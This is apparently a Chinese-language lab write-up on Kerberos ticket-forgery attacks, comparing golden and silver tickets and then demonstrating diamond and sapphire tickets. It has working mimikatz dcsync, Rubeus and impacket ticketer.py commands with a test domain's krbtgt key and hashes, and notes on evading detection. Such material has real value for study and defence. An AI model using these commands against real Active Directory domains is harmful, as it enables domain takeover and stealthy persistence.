票据传递攻击，和PTH有些类似，不过这里传递的不是hash，而是票据

## 黄金票据&白银票据

这两个票据及其攻击手法分别在先前的两个阶段攻击中介绍过了，这里就不再做过多的解释，主要是探讨一下这两个票据有什么区别，能拿来进行什么样的操作

### 金票与银票的区别

**使用的hash不同**

金票和银票的制作虽然相差无几，但是用到的hash是不一样的，金票使用的是krbtgt的ntlm hash而银票使用的是目标服务的hash

**访问权限的不同**

由于金票的拿到的hash权限较高，制作的票据自然能够访问所有的服务，相当于是拥有域控权限了

由于制作银票用到的hash是目标服务的hash,因此只能访问目标服务，但是通过ldap服务我们能够获取到krbtgt的hash从而制作金票

**认证流程不同**

- Golden Ticket 的利用过程需要访问域控(KDC)
- Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器

**二者能拿来做什么**

本来我是想用银票来横向的(cifs+host),后面被师傅反驳了，说我白费功夫，能拿到机器的hash，说明已经拿下这台机器了(在自己搭环境进行测试时没有注意到这点)，按照师傅的说法银票和金票一般都拿来做维权，例如银票拿个cifs，之后psexec就行了，金票就不用多说了，都能登录

## 钻石票据(Diamond Ticket)

钻石票据会通过域内用户请求合法的TGT后再使用krbtgt的AES256密钥对PAC进行解密、修改、重新加密，生成与合法 PAC 高度相似的 PAC，并且还可以生成合法请求。

制作钻石票据的前提条件

```shell
1、krbtgt账户的AES256密钥
2、域用户&密码
```

采用mimikatz来dump krbtgt用户的AES256密钥

```shell
privilege::debug
lsadump::dcsync /domain:hack.com /user:krbtgt
```

![diamond1](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/diamond1.png)

```
#key
aes256_hmac       (4096) : a839afa3136eda434f8a76e182f7cb0ef2713fdef1035ad7c7c083bff4863d35
```

使用Rubeus制作钻石票据

首先由域内普通用户请求正常的TGT，然后解密TGT，修改PAC权限，重新计算签名，并重新加密生成新ticket

```
Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /groups:GROUPS_ID(eg:512,518,519,520...)
```

```
Rubeus.exe diamond /domain:hack.com /user:Administrator /password:UU2FU3O@ADMIN /dc:DC.hack.com /enctype:AES256 /krbkey:a839afa3136eda434f8a76e182f7cb0ef2713fdef1035ad7c7c083bff4863d35 /ticketuser:hacker/groups:512
```

![rubeus](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/rubeus.png)

这样会生成base64的ticket,我们可以直接导入，或者是把ticket导出来使用，只需要加一个outfile参数，例如`/outfile:ticket.kirbi`

```
Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/DC.hack.com /ptt
```

在低权限主机上导入票据，即可访问DC的文件服务

![nop](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/nop.png)

![wino](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/wino.png)

或者采用别的方法申请钻石票据

```shell
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash. 
```

**相较于黄金票据**

钻石票据更加隐蔽，因为它有真实的AS_REQ的阶段，有合法的TGT.

TGT 由 DC 发布，这意味着它将拥有域的 Kerberos 策略中的所有正确详细信息。尽管这些可以在金票中准确伪造，但它更复杂且容易出错。

## 蓝宝石票据(Sapphire Ticket)

钻石票据通过解密来修改PAC中的特权组信息，使用户拥有对域控的访问权限，这样虽然能够绕过常规对TGS是否有AS_REQ的检测，但是伪造的用户实际上并不在这个特权组中，通过对特权组的检测，仍然能够检查到是否进行了钻石票据的攻击。

蓝宝石票据，相较于钻石票据的区别在于对PAC的修改方式，避免了被检测的问题，利用kerberos的扩展S4U2self + u2u来取得高权限用户的PAC，替换原始的PAC，因为特权群组里确实有这个高权限用户，所以就认定该PAC是合法的，从而绕过检测。

### U2U

Kerberos RFC 中将用户到用户身份验证描述为一种方法，该方法“允许客户端请求使用从 TGT 颁发给将验证身份验证的一方的会话密钥对 KDC 颁发的票证进行加密。

KRB_TGS_REQ将具有以下功能：

附加票证：将包含从中获取密钥的 TGT。

ENC-TKT-IN-SKEY：选项指示终端服务器的票证将在提供的附加 TGT 的会话密钥中加密。

服务名称 （sname） 可以引用用户，而不一定是具有 SPN 的服务。

U2U验证过程中的两个用户一个充当服务器，另一个充当客户端，允许用户去引用用户

### U2U+S4U2SELF

利用域用户发起TGT请求，收到TGT请求后以administrator身份通过S4U2self发起自身的ST请求，这时会请求失败，因为用户账户默认情况下是没有SPN的，但是使用U2U的情况，我们能够委托administrator用户去请求目标用户(域用户)的权限。

用户A没有SPN，但是在U2U扩展下，允许使用S4U2SELF，A充当服务器，KDN将返回目标用户B(充当客户端的用户)票据，而票据内含有PAC

### 利用

```shell
python3.8 ticketer.py -request -impersonate 'administrator' -domain 'hack.com' -user 'uu2fu3o' -password '!qaz@WSX' -aesKey 'a839afa3136eda434f8a76e182f7cb0ef2713fdef1035ad7c7c083bff4863d35' -domain-sid 'S-1-5-21-754643614-3937478331-2139222398' 'asd' -dc-ip 192.168.30.10 -nthash '8d0e4e5d28d91ac99f7b77368455d9b7'
# impersonate参数指定要伪造的目标域管用户
#domain参数指定域名
#user参数指定任意域用户
#password参数指定任意域用户的密码
#'asd' 任意用户名，可不存在
```

![蓝宝石](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/%E8%93%9D%E5%AE%9D%E7%9F%B3.png)

在低权限主机上导入票据

```
kerberos::ptc asd.ccache
```

![win2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/win2.png)
